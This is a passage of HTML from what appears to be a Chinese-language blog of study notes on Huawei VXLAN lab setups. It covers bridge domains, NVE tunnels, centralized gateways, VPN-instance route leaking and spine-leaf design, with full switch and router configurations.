class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LSW1 &amp; LSW2</span><br><span class=\"line\">trunk - access </span><br><span class=\"line\"></span><br><span class=\"line\">CE1 &amp; CE2 &amp; CE3</span><br><span class=\"line\">1.underlay</span><br><span class=\"line\">配置物理接口&amp;环回口地址</span><br><span class=\"line\">配置路由协议</span><br><span class=\"line\">2.VXLAN业务接入配置</span><br><span class=\"line\">配置BD域:BD域用于在NVE上本地区分不同的大二层网络，本地有效,没有全局意义，每一个BD域只能关联一个vni，在一台NVE上不同BD域需要关联不同VNI</span><br><span class=\"line\">bridge-domain 10 </span><br><span class=\"line\">VXLAN vni 10</span><br><span class=\"line\">将vlanid和BD域关联，BD域又和vni关联</span><br><span class=\"line\">int g1/0/0.10 mode l2</span><br><span class=\"line\">encapsulation dot1q vid 10</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\">创建VXLAN隧道</span><br><span class=\"line\">int nve 1</span><br><span class=\"line\">source 2.2.2.2</span><br><span class=\"line\">vin 10 head-end peer-list 3.3.3.3</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110110558492.png\" alt=\"image-20230110110558492\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LSW1</span><br><span class=\"line\">vlan batch 10 20 30 40</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/1</span><br><span class=\"line\"> port link-type access</span><br><span class=\"line\"> port default vlan 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/2</span><br><span class=\"line\"> port link-type trunk</span><br><span class=\"line\"> port trunk allow-pass vlan 2 to 4094</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/3</span><br><span class=\"line\"> port link-type access</span><br><span class=\"line\"> port default vlan 30</span><br><span class=\"line\"></span><br><span class=\"line\">CE2</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 2.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0.10 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 10</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0.30 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 30</span><br><span class=\"line\"> bridge-domain 20</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.2 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 2.2.2.2 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 2.2.2.2</span><br><span class=\"line\"> vni 10 head-end peer-list 3.3.3.3</span><br><span class=\"line\"> vni 20 head-end peer-list 3.3.3.3</span><br><span class=\"line\"> </span><br><span class=\"line\">CE3</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 30</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 3.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.3 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.20 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 20</span><br><span class=\"line\"> bridge-domain 20</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.40 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 40</span><br><span class=\"line\"> bridge-domain 30</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 3.3.3.3 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 3.3.3.3</span><br><span class=\"line\"> vni 10 head-end peer-list 2.2.2.2</span><br><span class=\"line\"> vni 20 head-end peer-list 2.2.2.2</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110111117399.png\" alt=\"image-20230110111117399\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110111302369.png\" alt=\"image-20230110111302369\"></p>\n<p>数据帧在 CE2 通过子接口，MAC，BD 上形成 MAC 地址表</p>\n<p>MAC-IN-UDP  通过封装 UDP 实现按照流的负载分担，Dport 4789</p>\n<p>在 VXLAN 中，不关心主机所在 VXLAN，只要在同一网段即可实现</p>\n<p>既可以实现网络虚拟化，将网络虚拟为两个不同的虚拟网络，租户之间网络隔离</p>\n<p>此时逻辑拓扑变为虚拟交换机连接同一租户的不同设备</p>\n<p>在公有云场景，为了适应虚拟机迁移的场景，使用 SDN 动态下发配置</p>\n<p>VXLAN 头端复制</p>\n<p>将 VXLAN 报文复制多份发给每一个当前 vni 中的 peer list</p>\n<p>vxlan 网络对 BUM 报文的转发行为默认是头端复制   broadcast-unknown-Multicast</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230111205055822.png\" alt=\"image-20230111205055822\"></p>\n<p>VXLAN I flag: 必须置为 1，标识 VNI 字段有效。</p>\n<p>UDP Dest Port: VXLAN 保留 UDP 目的端口号，默认为 4789</p>\n<p>UDP Source Port: 根据数据流 HASH 动态生成。</p>\n<p>不同流封装类型的接口对报文的处理方式</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230111211200322.png\" alt=\"image-20230111211200322\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230111213612876.png\" alt=\"image-20230111213612876\"></p>\n<p>一个物理接口下如果存在 default 接口，那么不能存在其他类型的接口</p>\n<h2 id=\"实验二跨子网互通集中式网关\"><a class=\"markdownIt-Anchor\" href=\"#实验二跨子网互通集中式网关\">#</a> 实验二：跨子网互通（集中式网关）</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CE1作为网关</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"></span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"></span><br><span class=\"line\">int vbdif 10</span><br><span class=\"line\">ip add 192.168.1.254 24 </span><br><span class=\"line\">int vbdif 20</span><br><span class=\"line\">ip add 192.168.2.254 24 </span><br><span class=\"line\"></span><br><span class=\"line\">CE2 - CE1 建立VXLAN </span><br><span class=\"line\">int nve 1</span><br><span class=\"line\">vni 10 head peer 1.1.1.1</span><br><span class=\"line\">vni 20 head peer 1.1.1.1 </span><br><span class=\"line\">CE3 - CE1 建立VXLAN</span><br><span class=\"line\">int nve 1</span><br><span class=\"line\">vni 10 head peer 1.1.1.1</span><br><span class=\"line\">vni 20 head peer 1.1.1.1 </span><br><span class=\"line\"></span><br><span class=\"line\">int nv1 </span><br><span class=\"line\">vni 10 head peer 2.2.2.2 3.3.3.3</span><br><span class=\"line\">vni 20 head peer 2.2.2.2 3.3.3.3</span><br><span class=\"line\"></span><br><span class=\"line\">主机网关设置vdbif接口地址</span><br><span class=\"line\"></span><br><span class=\"line\">对于多租户在网关上使用ip vpn-instance 实现</span><br><span class=\"line\"></span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\">route-dist 1:1</span><br><span class=\"line\"></span><br><span class=\"line\">int vbdif 10 </span><br><span class=\"line\">ip binding vpn-instance 10</span><br><span class=\"line\">ip add </span><br><span class=\"line\"></span><br><span class=\"line\">int vbdif 20 </span><br><span class=\"line\">ip binding vpn-instance 10</span><br><span class=\"line\">ip add </span><br><span class=\"line\"></span><br><span class=\"line\">对于每一个租户分配一个VPN-instance </span><br><span class=\"line\"></span><br><span class=\"line\">对于普通的vlan网络，设置接口类型，vlanif接口，即可实现vlan与VXLAN互通</span><br><span class=\"line\"></span><br><span class=\"line\">对于需要访问外网的场景</span><br><span class=\"line\">将VPN-instance中的路由泄露到public中，在VPN-instance中添加了一条静态路由</span><br><span class=\"line\">ip route-static vpn-instance A 0.0.0.0 0 10.1.11.10 public</span><br><span class=\"line\"></span><br><span class=\"line\">注意回包路由</span><br><span class=\"line\">1.将租户路由引回私网中</span><br><span class=\"line\">ip route-static 192.168.1.1 24 10.1.11.1</span><br><span class=\"line\">2.将public泄露到vpn中,public中会有一下一跳为VPN-instance的路由，迭代到出接口vbdif </span><br><span class=\"line\">ip route-static 192.168.1.0 24 vpn-instance A 192.168.1.1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">要求</span><br><span class=\"line\">1.对于同一租户，同子网和跨子网互通</span><br><span class=\"line\">2.vlan和VXLAN互通</span><br><span class=\"line\">3.VXLAN中租户和公网互通</span><br><span class=\"line\">4.CE1旁挂防火墙，实现路由隔离，nat在fw上，租户互通通过fw</span><br></pre></td></tr></table></figure>\n<p>网络虚拟化，对于租户来说，只消耗 vni 和直连路由</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230112221742698.png\" alt=\"image-20230112221742698\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230112224309888.png\" alt=\"image-20230112224309888\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CE1</span><br><span class=\"line\">vlan batch 10 20 30</span><br><span class=\"line\">#</span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">  route-distinguisher 1:1</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 1.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.1.254 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif20</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.2.254 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif30</span><br><span class=\"line\"> ip address 192.168.3.254 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.11.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/3</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> port default vlan 30</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 1.1.1.1 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 1.1.1.1</span><br><span class=\"line\"> vni 10 head-end peer-list 2.2.2.2</span><br><span class=\"line\"> vni 10 head-end peer-list 3.3.3.3</span><br><span class=\"line\"> vni 20 head-end peer-list 2.2.2.2</span><br><span class=\"line\"> vni 20 head-end peer-list 3.3.3.3</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 192.168.1.0 255.255.255.0 vpn-instance A 192.168.1.1</span><br><span class=\"line\">ip route-static 192.168.2.0 255.255.255.0 vpn-instance A 192.168.2.1</span><br><span class=\"line\">ip route-static vpn-instance A 0.0.0.0 0.0.0.0 10.1.11.2 public</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CE2</span><br><span class=\"line\">vlan batch 10 20</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 2.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.2 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.10 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 10</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.20 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 20</span><br><span class=\"line\"> bridge-domain 20</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 2.2.2.2 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 2.2.2.2</span><br><span class=\"line\"> vni 10 head-end peer-list 1.1.1.1</span><br><span class=\"line\"> vni 10 head-end peer-list 3.3.3.3</span><br><span class=\"line\"> vni 20 head-end peer-list 1.1.1.1</span><br><span class=\"line\"> vni 20 head-end peer-list 3.3.3.3</span><br><span class=\"line\"> </span><br><span class=\"line\">AR1</span><br><span class=\"line\">acl number 2000  </span><br><span class=\"line\"> rule 5 permit source 192.168.1.0 0.0.0.255 </span><br><span class=\"line\"> rule 10 permit source 192.168.2.0 0.0.0.255 </span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/0</span><br><span class=\"line\"> ip address 10.1.11.2 255.255.255.0 </span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/1</span><br><span class=\"line\"> ip address 10.1.21.1 255.255.255.0 </span><br><span class=\"line\"> nat outbound 2000</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 10.1.21.2</span><br><span class=\"line\">ip route-static 192.168.1.0 255.255.255.0 10.1.11.1</span><br><span class=\"line\">ip route-static 192.168.2.0 255.255.255.0 10.1.11.1</span><br></pre></td></tr></table></figure>\n<p>两个 VTEP 可以确定一条 VXLAN 隧道，VTEP 间的这条 VXLAN 隧道将被两个 NVE 间的所有 VNI 所共用。</p>\n<p>VXLAN 二层网关：允许租户接入 VxLAN 网络，实现相同 VxLAN 内部流量互访。</p>\n<p>VxLAN L3 Gateway: 实现不同 VxLAN 直接互访，或者 VxLAN 与非 VxLAN 网络互访。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230114212602424.png\" alt=\"image-20230114212602424\"></p>\n<p>L2-Subif: 用于用户接入，子接口上可以配置一层 tag 接入或者不配置 tag 接入；</p>\n<p>BD (Bridge-Domain): 标识一个二层广播域，BD 和 VNI 1:1 映射。所有广播域功能基于 BD 支持，如 MAC 学习、二层查表、广播复制等；</p>\n<p>NVE (Network Virtualization Edge): 主要用于本地 VTEP 地址管理，VXLAN 隧道管理，头端复制列表管理；</p>\n<p>VXLAN 隧道: VXLAN 隧道用于 VXLAN 报文的转发，用本地 VTEP 地址 + 远端 VTEP 地址标识﹔</p>\n<p>BDIF:BD 域的三层路由接口，用于二层流量进入三层进行路由转发；</p>\n<p>bridge-domain 20</p>\n<p>L2 binding vlan 10  // 全局关联 vlan 端口到 BD 域中</p>\n<p>VLAN 绑定 BD 后，该 BD 不支持创建对应的 VBDIF 接口。同时不支持创建该 VLAN 对应的 VLANIF 接口。</p>\n<p>VLAN 绑定 BD 功能和 ARP 广播报文抑制功能互斥，配置 VLAN 为 VXLAN 业务接入点后，不建议再使能 ARP 广播报文抑制功能</p>\n<p>ARP 广播抑制：抑制后续的 ARP 广播报文，由于首包之后 CE 上已经有了 arp 请求的主机的位置，只需要单播请求即可。arp 广播请求变 arp 单播请求</p>\n<p>第一次虚拟化：利用隧道技术将边缘设备互连透传二层报文；整网抽象理解成一台端口数目扩展的超大 LAN switch。</p>\n<p>第二次虚拟化利用 VNI 将这台超大的交换机虚拟出多个二层的广播域，和 VLAN 本质是一样的，VNI 类比 VLANID. 并通过定义 VXLAN header 中的 VNI 字段，将子网范围由 4K 扩展至 16M。</p>\n<p>vxlan 主要优点</p>\n<p>基于 IP 的 overlay, 仅需要边界设备间 IP 可达。</p>\n<p>隧道间水平分割、IP overlay TTL 避免环路。 网络层收到的 VXLAN 报文只能发给用户侧</p>\n<p>数据流量基于 IP 路由 SPF 及 ECMP 快速转发。</p>\n<p>网络变化实时侦听全网拓扑毫秒收敛</p>\n<p>Overlay+VNI 构建虚拟网络，支持多达 16M 的虚拟网络。</p>\n<p>物理设备、vSwitch 均能够部署。CE1800V 软件交换机也能做 VXLAN</p>\n<p>VXLAN 同子网互访模型</p>\n<p>1. 同一 OVS 之间</p>\n<p>2. 不同 OVS 之间</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122191207957.png\" alt=\"image-20230122191207957\"></p>\n<p>3. 不同 tor 之间</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122191226332.png\" alt=\"image-20230122191226332\"></p>\n<p>VXLAN 不同子网护网</p>\n<p>集中式网关</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122191735252.png\" alt=\"image-20230122191735252\"></p>\n<p>1. 流量迂回</p>\n<p>2. 网关 arp 表项过多可能成为网络瓶颈</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122192007255.png\" alt=\"image-20230122192007255\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122192117780.png\" alt=\"image-20230122192117780\"></p>\n<p>VXLAN 基于 spine-leaf 组网架构</p>\n<p>胖树</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122192248454.png\" alt=\"image-20230122192248454\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122193919103.png\" alt=\"image-20230122193919103\"></p>\n<p>spine 和网关分离部署，解决集中式网关容量问题</p>\n<p>spine 和网关融合部署</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122194413496.png\" alt=\"image-20230122194413496\"></p>\n<p>集中式网关场景下网关双活</p>\n<p>华为最多支持四台做多活，但只提高转发效率，不提高表项</p>\n<p>表项通过 DFS 同步</p>\n<p>需要通过双活组做网关扩容</p>\n<p>多活网关需要 VTEP 一样</p>\n<p>CE 模拟器基于包做负载分担</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122195628679.png\" alt=\"image-20230122195628679\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122195938635.png\" alt=\"image-20230122195938635\"></p>\n<p>集中式网关特点</p>\n<p>1. 流量存在迂回现象</p>\n<p>2. 网关需要维护主机的 mac 地址信息和 arp 信息，对设备表项容量要求高，容易遇到瓶颈</p>\n<p>3. 网关容易存在单点故障</p>\n<p>4. 跨子网的流量都由网关来完成，流量有明显控制点，网关维护用户路由信息，MAC 地址，ARP 表项，VXLAN 隧道路由</p>\n<p>leaf 只需要维护 MAC 地址信息和 VXLAN 隧道的路由信息，无需维护用户的路由信息</p>\n<p>第一个和第二三个问题可以采用分布式网关解决</p>\n<p>第三个问题可以使用双活网关解决</p>\n<p>如果非要用集中式网关</p>\n<p>1. 第一个问题无法解决</p>\n<p>2. 第二个问题采用多组网关解决容量问题</p>\n<p>3. 第三个问题采用多活网关</p>\n<p>集中式网关有网关和 spine 融合组网  适用业务稳定，规模稳定的私有云</p>\n<p>网关和 spine 分离组网    适用于业务变更频繁业务规模可以弹性伸缩的时候，中大型公有云和私有云</p>\n<h2 id=\"集中式双活网关过墙\"><a class=\"markdownIt-Anchor\" href=\"#集中式双活网关过墙\">#</a> 集中式双活网关过墙</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123214500930.png\" alt=\"image-20230123214500930\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 